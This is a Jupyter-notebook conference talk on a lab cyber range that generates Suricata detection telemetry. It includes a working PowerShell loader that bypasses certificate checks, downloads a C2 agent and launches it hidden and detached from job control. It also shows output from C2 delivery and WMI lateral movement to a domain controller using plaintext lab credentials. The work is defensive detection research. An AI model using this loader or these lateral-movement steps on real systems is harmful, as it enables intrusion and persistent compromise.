# AI-powered Cyber Range for Suricata Detection Engineering

* presentation agent: Markus Kont
* co-authored by: Whatever model did not trigger cyber policy safeguards at the time

## About

* Generating real attack telemetry
* One cannot detect without understanding the attack
    * ground truth is in short supply
* Everything else is plumbing
    * where most effort goes

## /whoami

* Security researcher and developer at [Stamus](https://github.com/stamusnetworks)
    * detection engineering and data analytics
* Former researcher, NATO CCDCOE
    * red-blue exercises, trainings, research, etc
* Rooted in devops and infra
* Digital sloyd

## /offline

![Making things](assets/making-things.jpg)

## Previously on Suricon..

* 2019 - red team telemetry and feedback, NATO exercises
* 2022 - jupyter notebooks for Suricata EVE
    * better EVE visibility, random case study
* 2024 - EVE SMB study for lateral movement detection
    * What NSM doesn't see
    * Going outside of typical PCAP workflow
    * random samples, no ground truth
* 2025 - enriching suricata EVE with endpoint logs
    * Real offensive telemetry
    * I accidentally a cyber range

## Cyber Range?

* **Why**: ground truth is scarce
    * Started off as simple IaC reorg
    * Live traffic is hard to control
    * Offline PCAPs: too small, no context
    * Best data is never shared
* **What**: Virtual, **controlled** environment
    * For trainings, exercises, etc
    * Scales from a few VMs to datacentres
    * IaC definition
    * Redeployable, baby!
    * Real telemetry, underused
* **How**: law of the wasteland

## Thou get sidetracked by BS every time

![Sidetracked](assets/da-ghoul.jpg)

## Pending TODO

* Should be trivial
* Payload → execute → beacon → Suricata sees it
* Automation keeps failing
    * beacon does not spawn
    * spawns but is then dead
    * spawns and is alive, but playbook stalls
    * ...

## Mähis

* https://github.com/ansible/ansible/blob/devel/lib/ansible/executor/powershell/async_wrapper.ps1
* https://github.com/ansible/ansible/blob/devel/lib/ansible/module_utils/csharp/Ansible._Async.cs
* `WinRM and sshd run inside a job object; child processes inherit it and are killed when the session closes`

In [ ]:
def build_powershell_script(payload_fname, staged_url):
    """The known-good delivery recipe, verbatim from the validated foothold.

    Load-bearing parts (do not "simplify"):
      * cert-bypass via an Add-Type C# delegate — a `{$true}` script block has
        no runspace on the SSL worker thread under Win11 PS 5.1.
      * stage under $env:TEMP — the GPO-hardened image denies non-admins Write
        on C:\\Users\\Public.
      * PE sanity check — a still-building payload serves an error body, and
        CreateProcess then rejects it as a bad image (err 193). Fail loud here.
      * CreateProcess with CREATE_BREAKAWAY_FROM_JOB — a plain download-and-run
        (curl / Start-Process) inherits sshd's job object and is killed on
        session close: the agent "spawns but is dead". This is the fix for that.
    """
    return f"""
Add-Type -TypeDefinition @"
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public static class CertTrust {{
    public static void Init() {{
        ServicePointManager.ServerCertificateValidationCallback +=
            delegate(object s, X509Certificate c, X509Chain ch, SslPolicyErrors e) {{ return true; }};
    }}
}}
"@
[CertTrust]::Init()
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$payload = Join-Path $env:TEMP '{payload_fname}'
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('{staged_url}', $payload)

$len = (Get-Item $payload).Length
$hdr = [System.IO.File]::ReadAllBytes($payload)[0..1] -join ','
if ($len -lt 10000 -or $hdr -ne '77,90') {{
    Write-Output ('payload_bad size=' + $len + ' hdr=' + $hdr)
    exit 1
}}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class HeadlessSpawn {{
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {{
        public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize;
        public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute;
        public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess; public IntPtr hThread; public Int32 dwProcessId; public Int32 dwThreadId;
    }}
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}}
"@

$si = New-Object HeadlessSpawn+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][HeadlessSpawn+STARTUPINFO])
$si.dwFlags = 1                # STARTF_USESHOWWINDOW
$si.wShowWindow = 0            # SW_HIDE
$pi = New-Object HeadlessSpawn+PROCESS_INFORMATION
$flags = 0x01000000 -bor 0x08000000   # CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW
$ok = [HeadlessSpawn]::CreateProcess(
    $payload, $null,
    [IntPtr]::Zero, [IntPtr]::Zero, $false, $flags,
    [IntPtr]::Zero, [System.IO.Path]::GetDirectoryName($payload),
    [ref]$si, [ref]$pi)
if ($ok) {{
    Write-Output ('payload_launched pid=' + $pi.dwProcessId)
}} else {{
    $e = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output ('payload_failed err=' + $e)
    exit 1
}}
"""

## Pass the butter

* Start from docs and API refs
* Skill starts as *theory*, matures by use
* Verbose output = *know-how*
* Run the skill live against the range
* **Capture the quirks**!
* Model debugs the skill live

![Pass the butter](assets/pass-the-butter.jpg)

## Railroad models with helper scripts

* Compound actions → small scripts
* Skill calls scripts; atomic actions as fallback
* Agent = script kiddie that handles drift

In [1]:
from adsim.tuoni.manage import tuoni_prep, tuoni_verify
from adsim.tuoni.deliver import tuoni_deliver
from adsim.tuoni.lateral import tuoni_lateral
from adsim.tuoni.cleanup import tuoni_cleanup
from adsim.exercise import Run
from adsim.postmortem.eve import pm_eve
from adsim.postmortem.pcap import pm_pcap

## The lab

![Lab topology](assets/cyber-range-lab.svg)

## Simulation run

* **run** is a repeatable unit of work
* boring by design
* everything drifts: env, techniques, noise, detections
* inventory changes between runs
* humans miss things

In [2]:
from dotenv import load_dotenv
load_dotenv()

EXER_RUNS_DIR = "runs"

In [3]:
!ls -lah runs/

total 0
drwxr-xr-x@  3 markuskont  staff    96B Nov 19 09:56 .
drwxr-xr-x@ 19 markuskont  staff   608B Nov 19 14:49 ..
drwxr-xr-x@  7 markuskont  staff   224B Nov 12 15:33 2026-11-11-1319-lateral-wmi


## Clerk, not a wizard

* clean state → open run
* embed ground truth
    * affected targets
    * offensive technique
    * EVE filters
    * timespan

In [4]:
import os

tuoni_cleanup(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    erase=True,
)

[*] Authenticating to https://10.137.1.15:8443
0 deactivated


no active agents — nothing to clean up


{'deactivated': []}

In [5]:
run = Run(
    EXER_RUNS_DIR,
    "lateral-wmi",
    techniques=["T1021.002", "T1047"],
    targets=[os.environ["TARGET_WS"], os.environ["TARGET_DC"]],
    eve_filter=[
        f"src_ip: {os.environ['TARGET_WS_IP']} AND dest_ip: {os.environ['TARGET_DC_IP']}",
        f"src_ip: {os.environ['TARGET_DC_IP']} AND dest_ip: {os.environ['TUONI_IP']}"
    ],
).open()
run

[+] opened run 2026-11-19-1450-lateral-wmi at /Users/markuskont/Workspaces/stamus/CR/suricon-2026/runs/2026-11-19-1450-lateral-wmi


Run('2026-11-19-1450-lateral-wmi', running)

## Initial compromise

* goal: lateral movement, not initial access
* clean slate initial compromise
    * C2 ready → deliver → beacon alive
* real world: phishing, drive-by
* lab shortcut, accepted

In [6]:
prep = tuoni_prep(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    payload_id=None,
    target_ip=os.environ["TARGET_WS_IP"],
    exec_user=os.environ["EXEC_USER"],
)

[*] Authenticating to https://10.137.1.15:8443
[*] Fetching listeners...
[*] Using listener id=1 name=HTTPS-Listener
[*] Checking payloads...
[+] Reusing payload id=7 name=payload-7

[+] Foothold prepared (Tuoni API side). Deliver over SSH, then verify.
    PAYLOAD_ID   : 7
    Listener     : id=1 port=443 host=10.137.1.15
    Staged URL   : https://10.137.1.15:443/payload?payloadId=7
    Active guids : (none)

    2) deliver over SSH (deliver.py — the only script that touches the target):
       deliver.py --staged-url 'https://10.137.1.15:443/payload?payloadId=7' \
         --target 10.137.1.35 --exec-user lab.user --exec-pass '<pw>'

    3) prove the callback over the API (deliver.py's 'process alive' is NOT this):
       manage.py --verify --pid <pid-deliver-printed>


In [7]:
deliv = tuoni_deliver(
    staged_url=prep["staged_url"],
    target=os.environ["TARGET_WS_IP"],
    exec_user=os.environ["EXEC_USER"],
    exec_pass=os.environ["EXEC_PASS"],
    settle=10,
)

[+] Staged URL : https://10.137.1.15:443/payload?payloadId=7
[+] Target     : 10.137.1.35 as lab.user
[+] Payload    : tuoni_agent_p7.exe

[*] Delivering and executing payload as lab.user
[*] SSH lab.user@10.137.1.35 [deliver+exec]: powershell.exe -EncodedCommand CgBBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgA
    out: payload_launched pid=3832

[*] Letting pid 3832 settle for 10s, then checking it is still there
[*] SSH lab.user@10.137.1.35 [liveness]: powershell.exe -Command "if (Get-Process -Id 3832 -ErrorAction SilentlyContinue) {'agent_alive'} els
    out: agent_alive
[+] pid 3832 still running

[+] Delivery complete — pid 3832 (alive).
    Delivery only confirms the process is running, NOT that the agent
    beaconed. Verify the callback over the Tuoni API (GET /agents/active)
    before running discovery/lateral — and do NOT cleanup until the
    callback is confirmed.


In [8]:
verify = tuoni_verify(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    pid=int(deliv["pid"]),
    known=",".join(prep["known_guids"]),
    max_wait=120,
)

[*] Authenticating to https://10.137.1.15:8443

[*] Waiting for the agent (pid=3832) to beacon (up to 120s)...
[+] Agent beaconed: guid=4f21fcde-de92-01e7-61ce-2698a796bbaf

[*] Sending whoami command...
[+] whoami: lab\lab.user


[+] Foothold verified — agent 4f21fcde-de92-01e7-61ce-2698a796bbaf is beaconing.


## jump-wmi

* WMI (Windows Management Instrumentation)
    * built-in remote admin API
    * valid admin creds = remote exec
* DCOM (Distributed COM)
    * WMI's transport
    * port 135 broker → dynamic port

In [9]:
tuoni_lateral(
    op="jump-wmi",
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    source=verify["guid"],
    payload_id=prep["payload_id"],
    target=os.environ["TARGET_DC"],
    username=os.environ["LATERAL_USER"],
    target_password=os.environ["LATERAL_PASS"],
    max_wait=120,
)

[*] Authenticating to https://10.137.1.15:8443


[*] Source: 4f21fcde (skunkworks-ws3) running as LAB\lab.user
[!] Source agent context is not obviously admin ('LAB\lab.user') — jump-* ops write ADMIN$ / open SCM. Proceeding.
[!] agent advertises no SELF exec-unit types (metadata.capabilities.supportedExecUnitTypesForSelfProcesses=[])
[!] agent integrity=Medium (not High)
[*] Source SELF exec units: (none advertised); integrity=Medium
[*] Submitting jump-wmi from agent 4f21fcde (skunkworks-ws3)
    config: {'target': 'skunkworks-dc.lab.local', 'payloadId': 7, 'username': 'LAB\\lab.admin', 'password': 'Labadmin1!'}
[*] Command sent (id=79) — waiting up to 120s
[+] jump-wmi done (cmd id=79)


* Copying file with SMB
   - Username: lab.admin
   - Domain: LAB
   - Path: \\skunkworks-dc.lab.local\C$\Windows\Tasks\WindowsMaintenanceV6_53357.exe
   - Trying authentication and share mapping
   - Writing file
   - Writing worked
 * Executing command via WMI
   - cmdline: C:\Windows\Tasks\WindowsMaintenanceV6_53357.exe
   - Username: LAB\lab.admin
   - Connecting to machine
   - Executing command line


-- command record --
{
  "id": 79,
  "commandTemplateId": "f69a4269-5456-4adc-bedb-c67806ea1e0e",
  "commandTemplateName": "jump-wmi",
  "configuration": {
    "target": "skunkworks-dc.lab.local",
    "payloadId": 7,
    "username": "LAB\\lab.admin",
    "password": "Labadmin1!"
  },
  "effectiveConfiguration": {
    "payloadId": 7,
    "copyMethod": null,
    "copyPath": null,
    "target": "skunkworks-dc.lab.local",
    "cmdline": null,
    "username": "LAB\\lab.admin",
    "password": "Labadmin1!"
  },
  "execConf": {
    "execType": "SELF",
    "execUnitType": null
  },
  "agentGuid": "4f21fcde-de92-01e7-61ce-2698a796bbaf",
  "created": "2026-11-19T14:53:57.727Z",
  "sent": "2026-11-19T14:54:04.661Z",
  "sendFormat": "SHELLCODE",
  "sends": [
    {
      "sendTime": "2026-11-19T14:54:04.661Z",
      "listenerId": 1,
      "status": "SUCCEEDED",
      "errorMessage": null,
      "sendFormat": "SHELLCODE",
      "event": {
        "id": "01a1f44c-ed75-7c05-9875-eeb7ed1259d2",
       

{'command_id': 79,
 'status': 'done',
 'stdout': ' * Copying file with SMB\n   - Username: lab.admin\n   - Domain: LAB\n   - Path: \\\\skunkworks-dc.lab.local\\C$\\Windows\\Tasks\\WindowsMaintenanceV6_53357.exe\n   - Trying authentication and share mapping\n   - Writing file\n   - Writing worked\n * Executing command via WMI\n   - cmdline: C:\\Windows\\Tasks\\WindowsMaintenanceV6_53357.exe\n   - Username: LAB\\lab.admin\n   - Connecting to machine\n   - Executing command line\n',
 'error': '',
 'new_agents': [{'guid': '41f44f1c-a4f5-b02e-21ca-6c20da61e0b9',
   'hostname': 'skunkworks-dc',
   'username': 'LAB\\lab.admin',
   'pid': 4472,
   'ips': '10.137.1.62'}]}

In [10]:
tuoni_cleanup(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    erase=True,
)

[*] Authenticating to https://10.137.1.15:8443


  -> die 41f44f1c erase=True
  ok 41f44f1c (skunkworks-dc)
  -> die 4f21fcde erase=True


2 deactivated


  ok 4f21fcde (skunkworks-ws3)


{'deactivated': [{'guid': '41f44f1c-a4f5-b02e-21ca-6c20da61e0b9',
   'hostname': 'skunkworks-dc'},
  {'guid': '4f21fcde-de92-01e7-61ce-2698a796bbaf',
   'hostname': 'skunkworks-ws3'}]}

## Fetch and freeze EVE

* Telemetry is the product
* Live, yet repeatable
* Frozen per run

In [11]:
run.close()
pm_eve(run.dir, elk_url=os.environ["ELK_URL"], resolve_flows=True, fetch_delay=30)

[+] closed run 2026-11-19-1450-lateral-wmi (completed)
[*] waiting 30s for flow flush
[*] agg: 55 flow_ids for 'src_ip: 10.137.1.35 AND dest_ip: 10.137.1.62'
[*] agg: 1 flow_ids for 'src_ip: 10.137.1.62 AND dest_ip: 10.137.1.15'
[+] resolved 56 flow_ids
[*] http://10.137.1.14:9200 -> suricata-2026.11.19 flow_ids=56 window=2026-11-19T14:50:53..2026-11-19T14:57:52
[+] 214 docs for 56 flow_ids
[+] wrote 214 docs to /Users/markuskont/Workspaces/stamus/CR/suricon-2026/runs/2026-11-19-1450-lateral-wmi/artifacts-suricata-eve.json
[+] wrote 52 community_ids to /Users/markuskont/Workspaces/stamus/CR/suricon-2026/runs/2026-11-19-1450-lateral-wmi/artifacts-community-ids.txt


{'eve_path': '/Users/markuskont/Workspaces/stamus/CR/suricon-2026/runs/2026-11-19-1450-lateral-wmi/artifacts-suricata-eve.json',
 'cid_path': '/Users/markuskont/Workspaces/stamus/CR/suricon-2026/runs/2026-11-19-1450-lateral-wmi/artifacts-community-ids.txt',
 'eve_count': 214,
 'cid_count': 52}

In [12]:
import pandas as pd
import json

DF = pd.json_normalize(json.loads((run.dir / "artifacts-suricata-eve.json").read_text()))
DF.groupby(["event_type"]).size()

event_type
alert        9
dcerpc      79
dns         17
flow        41
flow_agg     1
krb5        42
ldap         5
smb         19
tls          1
dtype: int64

In [13]:
def uniq(s):
    vals = s.dropna().map(lambda v: str(int(v)) if isinstance(v, float) and v.is_integer() else str(v))
    return ", ".join(vals.loc[~vals.isin(["", "<empty>"])].unique())

META = [c for c in [
    "krb5.cname",
    "krb5.sname",
    "smb.share",
    "smb.filename",
    "fileinfo.filename",
] if c in DF.columns]

SEQUENCE = (
    DF
    .assign(**{"dcerpc.interfaces": lambda df: df["dcerpc.interfaces"].map(
        lambda l: ", ".join(i["uuid"] for i in l) if isinstance(l, list) else None)})
    .groupby("flow_id")
    .agg(
        first_seen=("timestamp", "min"),
        src=("src_ip", "first"),
        dest=("dest_ip", "first"),
        port=("dest_port", "first"),
        event_type=("event_type", uniq),
        records=("event_type", "count"),
        bytes_toserver=("flow.bytes_toserver", "max"),
        bytes_toclient=("flow.bytes_toclient", "max"),
        alerts=("alert.signature", uniq),
        **{c: (c, uniq) for c in META},
    )
    .assign(metadata=lambda df: df[META].apply(
        lambda r: "; ".join(f"{k}: {v}" for k, v in r.items() if v), axis=1))
    .drop(columns=META)
    .sort_values(by=["first_seen", "port"])
)

with pd.option_context("display.max_rows", None, "display.max_colwidth", None):
    display(SEQUENCE)

,first_seen,src,dest,port,event_type,records,bytes_toserver,bytes_toclient,alerts,metadata
flow_id,,,,,,,,,,
1716077333058789,2026-11-19T14:51:00.994447+0000,10.137.1.35,10.137.1.62,53,flow,1,74.0,144.0,,
1716078544210631,2026-11-19T14:51:00.994977+0000,10.137.1.35,10.137.1.62,53,flow,1,74.0,144.0,,
1856360766032583,2026-11-19T14:51:10.301145+0000,10.137.1.35,10.137.1.62,53,"dns, flow",4,180.0,211.0,,
1912455840861581,2026-11-19T14:51:26.251139+0000,10.137.1.35,10.137.1.62,135,"dcerpc, flow",3,718.0,562.0,,
1932907836385413,2026-11-19T14:51:26.258914+0000,10.137.1.35,10.137.1.62,49682,"dcerpc, flow",6,3710.0,1500.0,,
1746466610558000,2026-11-19T14:51:26.933534+0000,10.137.1.35,10.137.1.62,135,"dcerpc, flow",4,940.0,680.0,,
1783031361035386,2026-11-19T14:51:26.945766+0000,10.137.1.35,10.137.1.62,49682,"dcerpc, flow",9,4344.0,2230.0,,
1922073592824006,2026-11-19T14:51:26.971805+0000,10.137.1.35,10.137.1.62,53,"dns, flow",5,203.0,385.0,,
1934698308958793,2026-11-19T14:51:26.975384+0000,10.137.1.35,10.137.1.62,389,"ldap, flow",2,253.0,222.0,,


## Cross tool correlation

* PCAP too, via community_id
* Endpoint context

In [14]:
cids = DF["community_id"].dropna().unique().tolist()
len(cids)

52

In [15]:
pm_pcap(
    run.dir,
    arkime_url=os.environ["ARKIME_URL"],
    arkime_user=os.environ["ARKIME_USER"],
    arkime_pass=os.environ["ARKIME_PASS"],
)

[+] wrote PCAP to /Users/markuskont/Workspaces/stamus/CR/suricon-2026/runs/2026-11-19-1450-lateral-wmi/artifacts-arkime.pcap (202154 bytes)


{'pcap_path': '/Users/markuskont/Workspaces/stamus/CR/suricon-2026/runs/2026-11-19-1450-lateral-wmi/artifacts-arkime.pcap'}

In [16]:
!ls -lah runs/*

runs/2026-11-11-1319-lateral-wmi:
total 2360
drwxr-xr-x@ 7 markuskont  staff   224B Nov 12 15:33 .
drwxr-xr-x@ 4 markuskont  staff   128B Nov 19 14:50 ..
-rw-r--r--@ 1 markuskont  staff   895K Nov 12 15:33 artifacts-arkime.pcap
-rw-r--r--@ 1 markuskont  staff   1.3K Nov 12 15:33 artifacts-community-ids.txt
-rw-r--r--@ 1 markuskont  staff   259K Nov 12 15:33 artifacts-suricata-eve.json
-rw-r--r--@ 1 markuskont  staff    14K Nov 12 15:33 findings.md
-rw-r--r--@ 1 markuskont  staff   440B Nov 12 15:33 run.json

runs/2026-11-19-1450-lateral-wmi:
total 2584
drwxr-xr-x@ 6 markuskont  staff   192B Nov 19 15:00 .
drwxr-xr-x@ 4 markuskont  staff   128B Nov 19 14:50 ..
-rw-r--r--@ 1 markuskont  staff   197K Nov 19 15:00 artifacts-arkime.pcap
-rw-r--r--@ 1 markuskont  staff   1.6K Nov 19 14:56 artifacts-community-ids.txt
-rw-r--r--@ 1 markuskont  staff   1.1M Nov 19 14:56 artifacts-suricata-eve.json
-rw-r--r--@ 1 markuskont  staff   447B Nov 19 14:55 run.json


## Aga kuidas see kõik tehisintellektiga seotud on??

...Ega vist olegi

![Ega vist olegi](assets/öööööö.jpg)

## Findings generation

* Demystify the LLM step
* LLM digest helps, even on a deterministic path
* Prebaked; compare samples, no live call
* Slow, randomly fails
* Its table inspired the pandas view

In [17]:
FINDINGS_COLS = [
    # universal
    "timestamp", "event_type", "flow_id", "community_id",
    "src_ip", "dest_ip", "src_port", "dest_port", "proto", "app_proto",
    # protocol — dcerpc
    "dcerpc.request", "dcerpc.response", "dcerpc.req.opnum", "dcerpc.interfaces",
    # protocol — smb
    "smb.command", "smb.status", "smb.filename", "smb.share",
    # protocol — krb5
    "krb5.msg_type", "krb5.cname", "krb5.sname", "krb5.realm",
    # protocol — tls
    "tls.version", "tls.ja3.hash", "tls.ja4", "tls.subject", "tls.issuerdn",
    # protocol — dns, http, file
    "dns.type", "dns.queries",
    "http.hostname", "http.url", "http.http_method", "http.http_user_agent",
    "fileinfo.filename", "fileinfo.sha256", "fileinfo.size",
    # alerts (enrichment)
    "alert.signature", "alert.signature_id", "alert.category",
    "alert.severity", "alert.action",
    # flow close
    "flow.bytes_toserver", "flow.bytes_toclient",
    "flow.start", "flow.end", "flow.state",
]

available = [c for c in FINDINGS_COLS if c in DF.columns]
EVE_CSV = DF[available].sort_values("timestamp").to_csv(index=False)
print(f"{len(available)}/{len(DF.columns)} columns retained, {len(DF.columns) - len(available)} trimmed, {len(EVE_CSV)} bytes")

39/245 columns retained, 206 trimmed, 52916 bytes


In [18]:
from pathlib import Path

skill_text = Path("skills/suricata-eve/SKILL.md").read_text()
run_meta = json.loads(run.marker_path.read_text())

system_msg = skill_text
user_msg = f"Generate findings.md for this run.\n\nRun metadata:\n{json.dumps(run_meta, indent=2)}\n\nSuricata EVE (CSV, {len(available)} columns, {len(DF)} events):\n{EVE_CSV}"
print(f"system: {len(system_msg)} chars, user: {len(user_msg)} chars")

system: 11015 chars, user: 53458 chars


In [19]:
from openai import OpenAI

if not os.environ.get("LLM_KEY"):
    print("LLM_KEY not set — skipping findings generation")
else:
    llm = OpenAI(base_url=os.environ.get("LLM_URL", "https://openrouter.ai/api/v1"), api_key=os.environ["LLM_KEY"])
    resp = llm.chat.completions.create(
        model=os.environ["LLM_MODEL"],
        messages=[{"role": "system", "content": system_msg}, {"role": "user", "content": user_msg}],
    )
    findings = resp.choices[0].message.content
    findings = findings[findings.index("# findings — "):]  # drop any reasoning preamble
    (run.dir / "findings.md").write_text(findings)

LLM_KEY not set — skipping findings generation


In [20]:
from IPython.display import Markdown

findings_path = run.dir / "findings.md" if os.environ.get("LLM_KEY") else Path('runs', '2026-11-11-1319-lateral-wmi', "findings.md")

print(findings_path)

if findings_path.is_file():
    display(Markdown(findings_path.read_text().replace("$", r"\$")))
else:
    print("no findings.md — run LLM cell or place file manually")

runs/2026-11-11-1319-lateral-wmi/findings.md


# findings — 2026-11-11-1319-lateral-wmi

## Run

| Field | Value |
|---|---|
| run_id | `2026-11-11-1319-lateral-wmi` |
| op_slug | `lateral-wmi` |
| start_time | `2026-11-11T13:19:25+00:00` |
| end_time | `2026-11-11T13:21:04+00:00` |
| status | `completed` |
| techniques | `T1021.002, T1047` |
| targets | `suricon-ws1.lab.local, suricon-dc.lab.local` |

---

## Flow index

169 events across 40 flows in window.

| # | First seen | Source | Destination | Port | Proto | Events | Traffic | Alert SIDs | Key metadata |
|---|---|---|---|---|---|---|---|---|---|
| 1 | 13:19:27.317 | 10.137.2.33 | 10.137.2.62 | 135 | dcerpc | 3 | 718 B↑ 562 B↓ | — | DCOM activation e1af8308, opnum 3 |
| 2 | 13:19:27.326 | 10.137.2.33 | 10.137.2.62 | 49682 | dcerpc | 7 | 3.9 KB↑ 1.8 KB↓ | — | iface 12345778… v0.0, opnum 77 ×4 |
| 3 | 13:19:27.961 | 10.137.2.33 | 10.137.2.62 | 135 | dcerpc | 4 | 940 B↑ 680 B↓ | — | DCOM activation e1af8308, opnum 3 ×2 |
| 4 | 13:19:27.975 | 10.137.2.33 | 10.137.2.62 | 49682 | dcerpc | 9 | 4.2 KB↑ 2.2 KB↓ | — | svcctl e3514235: op12 (OpenSCManager) ×3, op0/op1 ×3 each |
| 5 | 13:19:28.068 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 454 B↑ 505 B↓ | — | AS-REQ lab.user → KRB_ERROR |
| 6 | 13:19:28.075 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 1.9 KB↑ 1.9 KB↓ | — | TGS-REQ lab.user → suricon-ws1\$ |
| 7 | 13:19:28.468 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 457 B↑ 505 B↓ | — | AS-REQ lab.user → KRB_ERROR |
| 8 | 13:19:28.471 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 457 B↑ 505 B↓ | — | AS-REQ lab.user → KRB_ERROR |
| 9 | 13:19:28.501 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 591 B↑ 1.8 KB↓ | — | AS-REQ lab.user → AS-REP (TGT) |
| 10 | 13:19:28.503 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 1.8 KB↑ 1.8 KB↓ | — | TGS-REQ lab.user → host/suricon-ws1.lab.local |
| 11 | 13:19:29.349 | 10.137.2.33 | 10.137.2.62 | 53 | dns | 4 | 156 B↑ 201 B↓ | — | A wdcp.microsoft.com |
| 12 | 13:20:00.977 | 10.137.2.33 | 10.137.2.62 | 135 | dcerpc | 3 | 718 B↑ 562 B↓ | — | DCOM activation e1af8308, opnum 3 |
| 13 | 13:20:00.985 | 10.137.2.33 | 10.137.2.62 | 49682 | dcerpc | 6 | 3.6 KB↑ 1.5 KB↓ | — | iface 12345778… v0.0, opnum 77 ×3 |
| 14 | 13:20:01.490 | 10.137.2.33 | 10.137.2.62 | 135 | dcerpc | 4 | 940 B↑ 680 B↓ | — | DCOM activation e1af8308, opnum 3 ×2 |
| 15 | 13:20:01.503 | 10.137.2.33 | 10.137.2.62 | 49682 | dcerpc | 9 | 4.2 KB↑ 2.2 KB↓ | — | svcctl e3514235: op12 ×2, op0/op1 ×2 each |
| 16 | 13:20:01.534 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 454 B↑ 505 B↓ | — | AS-REQ lab.user → KRB_ERROR |
| 17 | 13:20:01.820 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 457 B↑ 505 B↓ | — | AS-REQ lab.user → KRB_ERROR |
| 18 | 13:20:01.823 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 457 B↑ 505 B↓ | — | AS-REQ lab.user → KRB_ERROR |
| 19 | 13:20:01.862 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 591 B↑ 1.8 KB↓ | — | AS-REQ lab.user → AS-REP (TGT) |
| 20 | 13:20:01.865 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 1.8 KB↑ 1.8 KB↓ | — | TGS-REQ lab.user → host/suricon-ws1.lab.local |
| 21 | 13:20:21.759 | 10.137.2.33 | 10.137.2.62 | 445 | smb | 24 | — | 2025701, 2025699 | lab.admin; \\suricon-dc.lab.local\C\$; CREATE+WRITE Windows\Tasks\DiskOptimizationV2_5537.exe (800768 B, sha256 3373e3ab…) |
| 22 | 13:20:21.767 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 436 B↑ 494 B↓ | — | AS-REQ lab.admin → KRB_ERROR |
| 23 | 13:20:21.798 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 570 B↑ 1.8 KB↓ | — | AS-REQ lab.admin → AS-REP (TGT) |
| 24 | 13:20:21.800 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 1.9 KB↑ 1.9 KB↓ | — | TGS-REQ lab.admin → cifs/suricon-dc.lab.local |
| 25 | 13:20:21.807 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 1.7 KB↑ 1.8 KB↓ | — | TGS-REQ lab.admin → krbtgt/LAB.LOCAL |
| 26 | 13:20:25.172 | 10.137.2.33 | 10.137.2.62 | 53 | dns | 3 | 80 B↑ 96 B↓ | — | A suricon-dc.lab.local |
| 27 | 13:20:25.282 | 10.137.2.33 | 10.137.2.62 | 135 | TCP | 1 | — | — | BIND 99fcfec4 (MSS) |
| 28 | 13:20:25.294 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 436 B↑ 494 B↓ | — | AS-REQ lab.admin → KRB_ERROR |
| 29 | 13:20:25.330 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 570 B↑ 1.8 KB↓ | — | AS-REQ lab.admin → AS-REP (TGT) |
| 30 | 13:20:25.333 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 1.9 KB↑ 2.0 KB↓ | — | TGS-REQ lab.admin → RPCSS/suricon-dc.lab.local |
| 31 | 13:20:25.345 | 10.137.2.33 | 10.137.2.62 | 135 | TCP | 3 | — | — | endpoint mapper 000001a0, opnum 4 |
| 32 | 13:20:25.407 | 10.137.2.33 | 10.137.2.62 | 135 | TCP | 1 | — | — | BIND 99fcfec4 (MSS) |
| 33 | 13:20:25.465 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 436 B↑ 494 B↓ | — | AS-REQ lab.admin → KRB_ERROR |
| 34 | 13:20:25.527 | 10.137.2.33 | 10.137.2.62 | 88 | krb5 | 3 | 570 B↑ 1.8 KB↓ | — | AS-REQ lab.admin → AS-REP (TGT) |
